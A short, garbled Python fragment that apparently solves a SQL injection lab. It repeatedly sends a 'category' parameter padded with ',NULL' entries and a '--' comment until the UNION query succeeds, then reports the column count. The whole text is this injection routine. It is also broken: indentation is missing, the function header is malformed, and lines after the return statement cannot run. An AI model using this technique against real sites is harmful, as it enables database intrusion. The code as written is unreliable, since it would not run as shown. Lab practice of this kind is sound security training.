def sqli_union_lab_1(null, sqli):...
"""docstring"""
lab1 = api_session.get(url, params=sqli)
while not lab1.ok:
null.remove('--')
print(f"There are {null.count('NULL')} columns")
null.extend([',', 'NULL', '--'])
return null
sqli['category'] = f"Lifestyle{' '.join(null)}"
lab1 = api_session.get(url, params=sqli)
